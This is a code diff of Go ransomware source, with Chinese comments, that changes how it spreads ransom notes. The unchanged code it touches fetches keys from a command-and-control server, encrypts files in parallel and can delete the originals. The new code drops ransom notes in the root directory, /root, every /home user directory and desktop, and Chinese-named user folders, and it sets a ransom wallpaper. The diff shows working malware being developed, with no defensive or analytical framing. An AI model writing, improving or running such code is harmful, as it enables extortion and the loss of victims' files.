@@ -194,8 +194,6 @@ func main() {
 
 	var stats counters
 	var finalUUID = "C2服务器连接失败"
-	// 新增变量，用于存储所有成功加密文件所在的目录 (去重)
-	var encryptedFileDirsForNotes []string
 
 	if *dryRunFlag {
 		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
@@ -206,20 +204,20 @@ func main() {
 	} else {
 		fmt.Println("\n[阶段 3: 载荷部署]")
 		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
-		// ！！！修复：捕捉 runEncryptionWorkers 的返回值！！！
-		encryptedFileDirsForNotes = runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
+		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
 		fmt.Println("\n[+] 载荷执行完毕。")
 	}
 
 	if !*dryRunFlag {
 		fmt.Println("\n[阶段 4: 勒索]")
-		fmt.Println("[*] 正在向全系统投放勒索信...")
+		fmt.Println("[*] 正在向Linux关键位置投放勒索信...")
 
-		// 修复：传入两个相同的UUID参数，以填充勒索信中的两个 %s 占位符
+		// 填充勒索信内容
 		noteContent := fmt.Sprintf(RANSOM_NOTE_CONTENT, finalUUID, finalUUID)
-		// ！！！修复：将收集到的加密文件目录作为第二个参数传入！！！
-		dropRansomNotes(noteContent, encryptedFileDirsForNotes)
-		fmt.Println("[+] 勒索信投放完毕。")
+
+		// 专门针对Linux环境投递勒索信
+		dropRansomNotesLinux(noteContent)
+		fmt.Println("[+] Linux关键位置勒索信投放完毕。")
 		createRansomWallpaper()
 	}
 
@@ -329,58 +327,133 @@ func simulateDestructiveActions() {
 	time.Sleep(1 * time.Second)
 }
 
-// 修改后的 dropRansomNotes 函数：在用户目录、桌面以及加密文件所在的目录投放勒索信
-func dropRansomNotes(content string, encryptedFileDirs []string) {
-	// 收集所有目标目录并去重
-	targetDirs := make(map[string]bool)
+// 专门针对Linux环境投放勒索信
+func dropRansomNotesLinux(content string) {
+	// Linux关键位置列表
+	linuxCriticalPaths := []string{
+		"/",      // 根目录
+		"/home",  // home目录
+		"/home/", // home目录(备用格式)
+		"/root",  // root用户目录
+	}
 
-	// 添加用户主目录及其常见子目录
-	for _, dir := range getUserDirsWithSubDirs() {
-		if dir != "" {
-			targetDirs[dir] = true
+	// 尝试获取当前用户和所有用户
+	currentUser, err := os.UserHomeDir()
+	if err == nil && currentUser != "" {
+		linuxCriticalPaths = append(linuxCriticalPaths, currentUser)
+	}
+
+	// 尝试遍历/home下的用户目录
+	if entries, err := os.ReadDir("/home"); err == nil {
+		for _, entry := range entries {
+			if entry.IsDir() {
+				userDir := filepath.Join("/home", entry.Name())
+				linuxCriticalPaths = append(linuxCriticalPaths, userDir)
+			}
 		}
 	}
 
-	// 添加桌面目录
-	desktopPath := getDesktopPath()
+	// 添加桌面路径
+	desktopPath := getLinuxDesktopPath()
 	if desktopPath != "" {
-		targetDirs[desktopPath] = true
+		linuxCriticalPaths = append(linuxCriticalPaths, desktopPath)
 	}
 
-	// 添加所有加密文件所在的目录
-	for _, dir := range encryptedFileDirs {
-		if dir != "" {
-			targetDirs[dir] = true
+	// 添加常见用户子目录
+	home, err := os.UserHomeDir()
+	if err == nil && home != "" {
+		subDirs := []string{
+			"Desktop", "桌面", // 桌面
+			"Documents", "文档", // 文档
+			"Downloads", "下载", // 下载
+			"Pictures", "图片", // 图片
+			"Videos", "视频", // 视频
+			"Music", "音乐", // 音乐
+			"Public", "公共", // 公共
+		}
+
+		for _, subDir := range subDirs {
+			dir := filepath.Join(home, subDir)
+			if _, err := os.Stat(dir); err == nil {
+				linuxCriticalPaths = append(linuxCriticalPaths, dir)
+			}
 		}
 	}
 
-	// 将去重后的目录转换为切片
-	var allUniqueDirs []string
-	for dir := range targetDirs {
-		allUniqueDirs = append(allUniqueDirs, dir)
-	}
+	fmt.Printf("[*] 将在 %d 个Linux关键位置投放勒索信...\n", len(linuxCriticalPaths))
+	successCount := 0
 
-	fmt.Printf("[*] 在 %d 个位置投放勒索信...\n", len(allUniqueDirs))
-	for _, dir := range allUniqueDirs {
-		// 确保目录存在，如果不存在则尝试创建
-		if _, err := os.Stat(dir); os.IsNotExist(err) {
+	for _, dir := range linuxCriticalPaths {
+		// 确保目录存在，如果不存在则跳过
+		if _, err := os.Stat(dir); os.IsNotExist(err) && dir != "/" && dir != "/home" && dir != "/root" {
+			// 对于非系统目录，如果不存在则尝试创建
 			if err := os.MkdirAll(dir, 0755); err != nil {
-				// 创建失败，跳过该目录
 				continue
 			}
+		} else if err != nil && (dir == "/" || dir == "/home" || dir == "/root") {
+			// 系统目录不存在，跳过
+			continue
 		}
 
 		notePath := filepath.Join(dir, ransomNoteFileName)
 		if err := os.WriteFile(notePath, []byte(content), 0644); err == nil {
+			successCount++
 			fmt.Printf("  ✓ 勒索信已投放至: %s\n", notePath)
+
+			// 如果是/home目录，还会尝试在/home/xxx/Desktop这样的子目录也投放
+			if dir == "/home" {
+				if entries, err := os.ReadDir("/home"); err == nil {
+					for _, entry := range entries {
+						if entry.IsDir() {
+							userDesktop := filepath.Join("/home", entry.Name(), "Desktop")
+							userNotePath := filepath.Join(userDesktop, ransomNoteFileName)
+							os.WriteFile(userNotePath, []byte(content), 0644)
+
+							userDesktopAlt := filepath.Join("/home", entry.Name(), "桌面")
+							userNotePathAlt := filepath.Join(userDesktopAlt, ransomNoteFileName)
+							os.WriteFile(userNotePathAlt, []byte(content), 0644)
+						}
+					}
+				}
+			}
 		} else {
 			fmt.Printf("  x 无法在 %s 投放勒索信: %v\n", notePath, err)
 		}
 	}
+
+	fmt.Printf("[+] 成功在 %d/%d 个Linux关键位置投放勒索信\n", successCount, len(linuxCriticalPaths))
+}
+
+func getLinuxDesktopPath() string {
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return ""
+	}
+
+	// 尝试多个可能的桌面目录
+	possibleDirs := []string{
+		filepath.Join(home, "Desktop"),
+		filepath.Join(home, "桌面"),
+		home, // fallback
+	}
+
+	for _, dir := range possibleDirs {
+		if _, err := os.Stat(dir); err == nil {
+			return dir
+		}
+	}
+
+	// 尝试创建桌面目录
+	desktopPath := filepath.Join(home, "Desktop")
+	if err := os.MkdirAll(desktopPath, 0755); err == nil {
+		return desktopPath
+	}
+
+	return home
 }
 
 func createRansomWallpaper() {
-	desktopPath := getDesktopPath()
+	desktopPath := getLinuxDesktopPath()
 	if desktopPath == "" {
 		fmt.Println("[!] 未能定位用于创建壁纸的桌面路径。")
 		return
@@ -459,24 +532,9 @@ func scanFiles(extFilter map[string]bool, scanRoots []string) []string {
 	return filesToProcess
 }
 
-// 修改 runEncryptionWorkers 函数以返回加密文件所在目录列表 (去重)
-func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) []string {
+func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
-
-	// 用于收集加密文件所在目录，线程安全
-	var dirsMutex sync.Mutex
-	encryptedFileDirsMap := make(map[string]bool) // 使用map去重
-
-	// 添加目录到集合（去重处理）
-	addDir := func(dir string) {
-		dirsMutex.Lock()
-		defer dirsMutex.Unlock()
-
-		if dir != "" && dir != "." && dir != "/" { // 过滤掉无效目录
-			encryptedFileDirsMap[dir] = true
-		}
-	}
 
 	log, err := newFileLog("ransom_log.txt")
 	if err != nil {
@@ -489,7 +547,7 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	if err != nil {
 		fmt.Printf("\n[致命错误] 无法从 C2 服务器 '%s' 获取加密密钥: %v。所有线程将失败。任务中止。\n", API_URL, err)
 		stats.failed.Add(uint64(len(files)))
-		return nil // 致命错误，返回空列表
+		return
 	}
 
 	*outUUID = resp.UUID
@@ -508,9 +566,6 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 					stats.failed.Add(1)
 				} else {
 					stats.success.Add(1)
-					// 记录加密文件所在目录
-					dir := filepath.Dir(file)
-					addDir(dir)
 				}
 			}
 		}(w + 1)
@@ -544,13 +599,6 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	close(done)
 	totalFiles := uint64(len(files))
 	fmt.Printf("\r[*] 加密完成。 [100.00%%] (%d/%d) \n", totalFiles, totalFiles)
-
-	// 将map中的唯一目录转换为切片返回
-	var uniqueEncryptedDirs []string
-	for dir := range encryptedFileDirsMap {
-		uniqueEncryptedDirs = append(uniqueEncryptedDirs, dir)
-	}
-	return uniqueEncryptedDirs
 }
 
 func fetchKeysFromAPI() (*APIResponse, error) {
@@ -613,7 +661,6 @@ func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
 	return extFilter[strings.ToLower(filepath.Ext(filePath))]
 }
 
-// 修改 getUserDirsWithSubDirs 函数以返回更多用户相关目录（Linux专属）
 func getUserDirsWithSubDirs() []string {
 	home, err := os.UserHomeDir()
 	if home == "" || err != nil {
@@ -628,14 +675,13 @@ func getUserDirsWithSubDirs() []string {
 	if runtime.GOOS == "linux" {
 		linuxSubDirs := []string{
 			"Documents", "Downloads", "Public", "Templates", "Music", "Pictures", "Videos",
+			"文档", "下载", "公共", "模板", "音乐", "图片", "视频", // 中文目录
 		}
 
 		for _, subDir := range linuxSubDirs {
 			dir := filepath.Join(home, subDir)
-			// 检查目录是否存在再添加
-			if _, err := os.Stat(dir); err == nil {
-				dirs = append(dirs, dir)
-			}
+			// 即使目录不存在也添加，因为后续会尝试创建
+			dirs = append(dirs, dir)
 		}
 	}
 
@@ -651,33 +697,7 @@ func getKeys(m map[string]bool) []string {
 }
 
 func getDesktopPath() string {
-	home, err := os.UserHomeDir()
-	if err != nil {
-		return ""
-	}
-	switch runtime.GOOS {
-	case "windows", "darwin":
-		return filepath.Join(home, "Desktop")
-	case "linux":
-		if xdg := os.Getenv("XDG_DESKTOP_DIR"); xdg != "" {
-			return xdg
-		}
-		// 尝试多个可能的桌面目录
-		possibleDirs := []string{
-			filepath.Join(home, "Desktop"),
-			filepath.Join(home, "桌面"), // 考虑中文系统
-			// 备用，如果以上都不存在，可能home本身就是最顶层目录或没有专门的桌面文件夹
-			home,
-		}
-		for _, dir := range possibleDirs {
-			if _, err := os.Stat(dir); err == nil {
-				return dir
-			}
-		}
-		return home // fallback
-	default:
-		return home
-	}
+	return getLinuxDesktopPath()
 }
 
 func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
@@ -697,13 +717,6 @@ func processFile(filePath string, publicKeyStr string, removeOriginal bool) erro
 	if err != nil {
 		return err
 	}
-
-	// !!! ！！！移除每次加密文件都投放勒索信的逻辑！！！ ！！！
-	// 因为勒索信的投放会在 encryptionWorkers 完成后统一由 dropRansomNotes 函数处理，避免重复。
-	// dir := filepath.Dir(filePath)
-	// notePath := filepath.Join(dir, ransomNoteFileName)
-	// noteContent := fmt.Sprintf("此文件夹下的文件已被加密: %s", filepath.Base(filePath))
-	// os.WriteFile(notePath, []byte(noteContent), 0644)
 
 	if removeOriginal {
 		err = os.Remove(filePath)
